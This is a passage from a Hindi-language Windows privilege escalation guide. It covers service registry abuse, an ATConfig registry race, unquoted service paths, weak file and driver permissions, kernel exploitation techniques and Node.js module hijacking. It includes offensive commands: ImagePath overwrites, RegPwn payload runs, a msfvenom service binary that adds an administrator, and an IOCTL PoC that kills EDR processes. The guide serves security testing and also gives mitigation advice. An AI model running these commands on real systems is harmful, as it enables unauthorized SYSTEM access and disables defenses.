जाँचें कि किसी विशेष service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। केवल ACL entry से effective access साबित नहीं होता: deny entries, मौजूदा token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए service configuration में इस्तेमाल करने योग्य field, service को trigger करने का तरीका और अधिक privileged service identity भी ज़रूरी हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

execute किए जाने वाले binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race से arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features per-user **ATConfig** keys बनाते हैं, जिन्हें बाद में एक **SYSTEM** process कॉपी करके HKLM session key में लिखता है। Registry **symbolic link race** से इस privileged write को **किसी भी HKLM path** पर redirect किया जा सकता है, जिससे arbitrary HKLM **value write** primitive मिलता है।<sup>[[18]](#references)</sup>

मुख्य locations (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में installed accessibility features की सूची होती है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में user-controlled configuration store होती है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाई जाती है और user इसमें लिख सकता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value सेट करें जिसे SYSTEM से लिखवाना चाहते हैं।
2. secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock trigger होने पर **HKLM Session ATConfig** key को protected HKLM target की ओर इंगित करने वाले **registry link** से बदल दें।
4. SYSTEM attacker द्वारा चुनी गई value को redirect किए गए HKLM path पर लिखता है।

जब आपके पास arbitrary HKLM value write हो, तो service configuration values overwrite करके LPE करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे सामान्य user start कर सकता हो (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में **workstation को lock** करता है।

उदाहरण tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

अगर आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, यह **arbitrary code execute करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

अगर executable का path quotes के अंदर नहीं है, तो Windows space से पहले समाप्त होने वाले हर path को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows इन्हें execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

सभी unquoted service paths सूचीबद्ध करें, built-in Windows services से जुड़े paths को छोड़कर:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप metasploit से** इस vulnerability का पता लगा सकते हैं और इसका exploit कर सकते हैं: `exploit/windows/local/trusted\_service\_path` आप metasploit से मैन्युअल रूप से एक service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने देता है कि कोई service विफल होने पर कौन-सी कार्रवाइयाँ की जाएँ। इस सुविधा को किसी binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदला जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task की script targets

ऐसे enabled task के लिए जो `.bat` या `.cmd` फ़ाइल के साथ `cmd.exe /c` चलाता है, **action arguments** में दी गई script और `cmd.exe`—दोनों की जाँच करें। यही बात interpreter के स्पष्ट file argument, जैसे PowerShell `-File`, पर भी लागू होती है। यदि scheduled batch file में सीधे लिखा हुआ PowerShell `-File` call है, तो उस संदर्भित script की ACL भी जाँचें; variables, conditionals और shell chaining के लिए मैन्युअल रूप से trace करना ज़रूरी है। Caller द्वारा लिखी जा सकने वाली script या parent directory, cross-account execution का सुराग तभी है जब configured task principal, caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL मायने रख सकती है, लेकिन पहले का `exit` या अन्य control flow जोड़ी गई lines को unreachable बना सकता है। privilege escalation का दावा करने से पहले effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory के दौरान script में बदलाव न करें और task शुरू न करें।

## Accessible files पर named streams

NTFS पर किसी readable file में named `:$DATA` stream हो सकती है, जिसकी सामग्री साधारण directory listing में नहीं दिखती। Accessible backup या configuration files के छोटे, प्रासंगिक समूह के लिए, कोई भी सामग्री खोलने से पहले stream के **नाम और आकार** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) और PowerShell के [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के ज़रिए उपलब्ध कराता है। Secret का संकेत देने वाला stream name केवल एक सुराग है। File की effective read access, filesystem द्वारा streams के support, stream में उपयोगी credentials की मौजूदगी और वे credentials वास्तव में किस account से authenticate करते हैं—इनकी जाँच करें। नियमित enumeration के दौरान recursive stream scans और stream की सामग्री प्रिंट करने से बचें।

## Scheduled Windows Driver Kit helper inputs

वैकल्पिक Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपनी run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` file का उपयोग कर सकता है। यदि कोई scheduled task या service इस helper को privileged account से शुरू करता है, तो इन inputs पर low-privilege write access उस account के context में command execution संभव कर सकता है—भले ही helper executable सुरक्षित हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या बदली जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action की [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths की ACLs जाँचें। यदि task working directory निर्दिष्ट नहीं करता, तो executable की directory केवल जाँचने योग्य सुराग है, इस बात का प्रमाण नहीं कि task अपने inputs वहीं से पढ़ता है। Project working-file की पूर्वशर्त भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, वास्तविक task principal की जाँच करें।

## Applications

### Installed Applications

**binaries की permissions** (शायद आप किसी को overwrite करके privileges escalate कर सकें) और **folders** की permissions ([DLL Hijacking](dll-hijacking/index.html)) जाँचें।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और फिर replacement विफल होने पर पहले से मौजूद write-protected file को execute करते थे। Vendor ने 2.1.0p40, 2.2.0p23, 2.3.0b1 और 2.4.0b1 में इस समस्या को ठीक किया। इंस्टॉल किए गए पूरे patch level और इस बात की जाँच करें कि प्रभावित agent operation चल सकता है या नहीं; केवल branch का label, जैसे `2.1`, exposure की पुष्टि नहीं कर सकता। Enumeration बिना files बनाए या agent commands चलाए version, service state और Temp permissions की जाँच कर सकता है।

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ने ADSelfService Plus build 6210 और उससे पुराने builds को प्रभावित किया; vendor ने इसे build 6211 में ठीक किया। यह केवल तभी प्रासंगिक है जब SAML SSO **enabled हो या पहले enabled रहा हो**। इसलिए, installed-product entry या service path केवल जाँच का सुराग है, vulnerability का निष्कर्ष नहीं: exact build, SAML configuration history, service की network reachability और जिस account के तहत यह चलता है, उसकी पुष्टि करें। Service के ज़रिए code execution को उसी account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के तहत चलना ज़रूरी है। Product के Backup directory में पढ़ी जा सकने वाली `OfflineBackup_*.ezip` एक अलग encrypted backup का सुराग है, usable credential या इस SAML flaw का प्रमाण नहीं। Routine enumeration के दौरान उसे unpack किए बिना उसका path और access rights दर्ज करें।

#### Jenkins controller और domain-account की सीमाएँ

Windows Jenkins controller पर, job बनाने या configure करने की permission और उसे शुरू करने की permission को अलग-अलग समझें: [Jenkins इन्हें अलग-अलग `Job/Create`, `Job/Configure` और `Job/Build` rights के रूप में दस्तावेज़ित करता है](https://www.jenkins.io/doc/book/security/access-control/permissions/). Configured schedule या remote trigger से build चलाने का एक और रास्ता मिल सकता है, लेकिन पुष्टि करें कि यह enabled है और build वास्तव में चलता है। Execution को controller या चुने गए agent की identity मिलती है, और stored credential तभी इस्तेमाल किया जा सकता है जब job को उसके scope तक access हो। अलग से, `JENKINS_HOME` metadata तक access की जाँच करें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret` और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). इनका मौजूद होना अपने-आप password उजागर नहीं करता; साझा output में secrets दिखाए बिना **ज़रूरी files तक read access** और account के पुनः उपयोग का एक अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object के `scriptPath` पर write right है, तो cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाले किसी वास्तविक logon या scheduled consumer की पुष्टि करें। आगे का group control पाने के लिए प्रभावी AD rights को अलग से सत्यापित करना ज़रूरी है।

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server या Azure Pipelines project के लिए, pipeline **बनाने या edit करने** की permission को उसे **queue** करने और चुने गए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दस्तावेज़ित करता है। यदि किसी कम privileged account से script step submit करके उस pipeline को self-hosted Windows agent पर चलाया जा सकता है, तो step [agent के configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले exact pipeline, branch/resource restrictions, authorized pool, चल सकने वाले job और agent service identity की पुष्टि करें। Installed agent, project role या repository write अकेले केवल जाँच के सुराग हैं; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की समीक्षा करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft बताता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) कि **ADSync service account** synchronization service चलाता है और उसके SQL database तक पहुँचता है, जबकि **AD DS connector account** की directory permissions configured sync features पर निर्भर करती हैं। Connector credentials उस database में encrypted रूप से stored होते हैं और key material को [ADSync service account के तहत DPAPI द्वारा सुरक्षित रखा जाता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service का installed होना, local administrator जैसा दिखने वाला group या database दिखाई देना—इनमें से कोई भी decryptable credential या domain escalation की पुष्टि नहीं करता। Database के वास्तविक read rights, service-account/key access, installation और SQL layout, configured connector identity तथा उस identity के प्रभावी AD privileges की अलग-अलग समीक्षा करें। Routine enumeration में केवल service और access metadata दिखाएँ; stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver की support DLLs `C:\ProgramData` के तहत हो सकती हैं और अधिक privileged print process में load हो सकती हैं। Exact driver directory और DLL ACLs की समीक्षा करें; इसमें parent directories और reparse points भी शामिल करें, भले ही printer WMI enumeration की अनुमति न हो। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए रिपोर्ट किया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [मूल disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) में `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन है। Writable ACL केवल जाँच का सुराग है: deny entries के बाद प्रभावी write access, संबंधित driver के installed होने और privileged identity के तहत file load करने, तथा vendor के updated driver या security program से installation ठीक हुई है या नहीं—इन सबकी पुष्टि करें। केवल directory name या driver version के आधार पर vulnerability न मानें।

### Write Permissions

जाँचें कि क्या आप किसी config file में बदलाव करके किसी विशेष file को पढ़ सकते हैं, या किसी ऐसे binary को बदल सकते हैं जिसे Administrator account द्वारा execute किया जाएगा (schedtasks)।

System में कमजोर folder/files permissions खोजने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` सबफ़ोल्डर में मौजूद किसी भी plugin DLL को autoload करता है। अगर writable portable/copy install मौजूद है, तो malicious plugin डालने से हर बार लॉन्च पर `notepad++.exe` के अंदर automatic code execution मिलता है (जिसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलने वाले प्रोग्राम

**जाँचें कि क्या आप किसी ऐसे registry या binary को overwrite कर सकते हैं जिसे कोई दूसरा user चलाने वाला है।**\
**privileges escalate करने के लिए दिलचस्प autoruns locations** के बारे में अधिक जानने के लिए **यह पेज पढ़ें**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third-party अजीब/कमज़ोर** drivers खोजें

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver मनमाना kernel read/write primitive उजागर करता है (खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम), तो आप सीधे kernel memory से SYSTEM token चुराकर privilege escalate कर सकते हैं।<sup>[[13]](#references)</sup> चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel-exploitation से जुड़ी सामग्री:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

उन race-condition bugs के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने से (max-length components या deep directory chains का उपयोग करके) window को microseconds से बढ़ाकर tens of microseconds तक किया जा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, और I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमजोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock अभी held रहते request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation leak करती है।<sup>[[29]](#references)</sup>

Audit और exploitation से जुड़े नोट्स:

- **Free-under-lock + cancel afterwards**: ऐसे success path की तलाश करें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में resume होकर freed `PFLT_CALLBACK_DATA` को driver के remove callback में वापस भेज सकता है।
- **Freed queue object को reclaim करें**: इसके लिए उसी आकार का attacker-controlled paged-pool allocation इस्तेमाल करें। `NPFS` Data Queue Entries उपयोगी हैं, क्योंकि उनके payload और size को नियंत्रित किया जा सकता है और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हों, तो उन्हें **user memory में fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर रुकने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount-adjacent fields) में इस्तेमाल होने वाले nested context pointer को redirect करता है, तो आपको **address-controlled but not value-controlled** kernel write मिल सकता है। ऐसे में final code/data pointer को target करने के बजाय sprayed pool object के **length/size** field को target करें, फिर spray में तब तक खोजें जब तक corrupted object से **out-of-bounds paged-pool read** न मिल जाए।
- **Raceable disclosure pattern**: ऐसा कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता है, एक मजबूत candidate है। यदि attacker copied buffer को बड़ा कर सकता है, तो reliability बेहतर होती है (उदाहरण के लिए, कई list/resource entries जोड़कर जो serializer के final allocation size को बढ़ाती हैं), क्योंकि इससे लंबा copy replacement window को बढ़ाता है और ज़रूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays उत्कृष्ट disclosure targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element एक `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से किसी array को leak करें, आसपास का `IORING_OBJECT` recover करें, फिर **`RegBuffers`** और **`RegBuffersCount`** corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का उपयोग करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write से आपको कोई स्थिर byte मिलता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो **overlapping unaligned writes** का उपयोग करके `0x0101010101010101` जैसा repeated-byte user pointer बनाएँ, उसे `VirtualAlloc` से map करें, और forged registered-buffer array वहाँ रखें।<sup>[[30]](#references)</sup>

उपयोगी debugging संकेत:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

एक बार corrupted I/O ring से arbitrary kernel read/write हासिल कर लेने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities से deterministic layouts तैयार किए जा सकते हैं, writable HKLM/HKU descendants का दुरुपयोग किया जा सकता है, और बिना custom driver के metadata corruption को kernel paged-pool overflows में बदला जा सकता है। पूरी chain यहां जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Attacker-controlled paths से `RtlQueryRegistryValues` में direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह जांचते हैं कि वह एक मान्य UTF-16 string है, और फिर stack scalar जैसे `int readValue` में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद न हो, तो `EntryContext` की व्याख्या developer की अपेक्षित type के बजाय registry की **वास्तविक** type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path से driver को attacker-chosen keys query करने, return codes/logs के ज़रिए उनके अस्तित्व का leak करने, और कभी-कभी ऐसे values पढ़ने के लिए कहा जा सकता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination, registry value type के अनुसार `REG_QWORD`, `UNICODE_STRING` या sized binary buffer के रूप में type-confused हो जाता है।

व्यावहारिक exploitation नोट्स:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी **untrusted hive** तक पहुंचती है, लेकिन उसमें `RTL_QUERY_REGISTRY_TYPECHECK` नहीं है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, values को `HKCU` में stage करने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, और फिर duplicated **low-integrity** token के साथ scan दोबारा चलाएं, ताकि sandboxed contexts से पहुंच योग्य keys मिल सकें:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write, आस-पास के stack data को corrupt करता है और पास के callback/function pointer को आंशिक रूप से overwrite कर सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित करता है और `Buffer` pointer को आंशिक रूप से प्रभावित करता है, जिससे semi-controlled kernel write हो सकता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर पहले `LONG` को signed buffer size मानता है। अगर पिछली `REG_DWORD` read, दोबारा इस्तेमाल किए गए scalar में attacker-controlled **negative** value छोड़ देती है, तो अगली `REG_BINARY` query attacker के bytes को सीधे आस-पास के stack slots पर copy करती है। अक्सर callback pointer को पूरी तरह overwrite करने का यह सबसे साफ़ तरीका होता है।

एक मज़बूत hunting pattern: **एक ही stack variable में बिना reinitialize किए अलग-अलग प्रकार की registry reads करना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers और उन code paths के लिए grep करें जहाँ पहली registry read यह नियंत्रित करती है कि दूसरी read होगी या नहीं।

#### Device objects पर FILE_DEVICE_SECURE_OPEN सेट न होने का फायदा उठाना (LPE + EDR kill)

कुछ signed third-party drivers, IoCreateDeviceSecure का इस्तेमाल करके मज़बूत SDDL के साथ अपना device object बनाते हैं, लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, जब device को extra component वाले path के ज़रिए खोला जाता है, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user इस तरह का namespace path इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

जब कोई user device खोल सकता है, तो driver द्वारा उपलब्ध कराए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के लिए full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी प्रतिबंध के raw disk read/write (offline tampering, boot-time persistence की तरकीबें)।
- Protected Process/Light (PP/PPL) समेत मनमाने processes को terminate करना, जिससे kernel के ज़रिए user land से AV/EDR kill किया जा सकता है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

डेवलपर्स के लिए mitigation
- DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को validate करें। Process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges देने के बजाय brokered models पर विचार करें।

डिफेंडर्स के लिए detection के विचार
- संदिग्ध device names (जैसे, \\ .\\amsdk*) को user-mode से खोलने और दुरुपयोग के संकेत देने वाले विशिष्ट IOCTL sequences पर निगरानी रखें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास **PATH में मौजूद किसी folder के अंदर write permissions हैं**, तो आप किसी process द्वारा load की गई DLL को hijack करके **privileges escalate** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH के सभी folders की permissions जाँचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस check का दुरुपयोग कैसे किया जा सकता है, इसके बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

यह **Windows uncontrolled search path** का एक variant है, जो **Node.js** और **Electron** applications को तब प्रभावित करता है जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं** होता।<sup>[[20]](#references)</sup>

Node packages को resolve करने के लिए directory tree में ऊपर की ओर जाता है और हर parent में `node_modules` folders जाँचता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application ये paths जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **कम-विशेषाधिकार वाला user** `C:\node_modules` बना सकता है, तो वह वहाँ malicious `foo.js` (या package folder) रख सकता है और किसी **अधिक-विशेषाधिकार वाले Node/Electron process** के missing dependency को resolve करने की प्रतीक्षा कर सकता है। Payload victim process के security context में execute होता है, इसलिए जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app से चलता है, तो यह **LPE** बन जाता है।

यह खास तौर पर आम है जब:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
